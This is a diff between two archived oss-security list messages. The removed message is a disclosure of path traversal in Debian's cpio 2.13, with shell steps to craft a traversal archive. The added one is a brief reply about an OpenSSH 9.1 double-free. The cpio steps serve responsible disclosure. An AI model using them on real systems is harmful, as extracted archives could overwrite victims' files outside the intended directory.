@@ -1,40 +1,25 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/12/21/8
-Message-ID: <65846ba9.7d4fbb18.bm000@oddnet.de>
-Date: Thu, 21 Dec 2023 17:44:50 +0100
-From: Ingo Brückl <ib@...net.de>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/02/02/6
+Message-ID: <Y9whSM9p5F8tqxCp@xosc.org>
+Date: Thu, 2 Feb 2023 21:47:04 +0100
+From: Matthias Schmidt <oss-sec@...c.org>
 To: oss-security@...ts.openwall.com
-Subject: Security vulnerability in Debian's cpio 2.13
+Subject: Re: double-free vulnerability in OpenSSH server 9.1
 Content-Type: text/plain; charset=utf-8
 
-Debian has applied patch "revert-CVE-2015-1197-handling" to cpio
-(2.13+dfsg-7.1) to "Fix a regression in handling of CVE-2015-1197 &
---no-absolute-filenames by reverting part of an upstream commit." and to
-close Debian bugs #946267 ("cpio -i --no-absolute-filenames breaks symlinks
-starting with / or /..") and #946469 ("initramfs-tools-core: unmkinitrams
-creates broken binaries").
+Hi,
 
-This patch made Debian cpio 2.13 vulnerable to path traversal.
+* Georgi Guninski wrote:
+> Nice find :)
+> This is very complicated codepath, did a human found it "manually"
+> or some analysis program found it?
+> The warez are so large, they are hard for me manually.
 
-The vulnerability has been reported to the Debian bug tracking system:
+According to djm@ [1] it was found manually and the first bug reported on
+the Fediverse.
 
-  https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1059163
+Cheers
+	
+	Matthias
 
-Instructions to craft a cpio archive to demonstrate the vulnerability:
-
-  mkdir test_cpio
-  ln -sf /tmp/ test_cpio/tmp
-  echo "TEST Traversal" > test_cpio/tmpYtrav.txt
-  cd test_cpio/
-  ls | cpio -ov > ../trav.cpio
-  cd ../
-  sed -i s/"tmpY"/"tmp\/"/g trav.cpio
-
-Even
-
-  cpio -id --no-absolute-filenames -I trav.cpio
-
-doesn't prevent path traversal with Debian's cpio, although it does with the
-original cpio.
-
-Ingo
+[1] https://cybervillains.com/@djm/109795488319439723
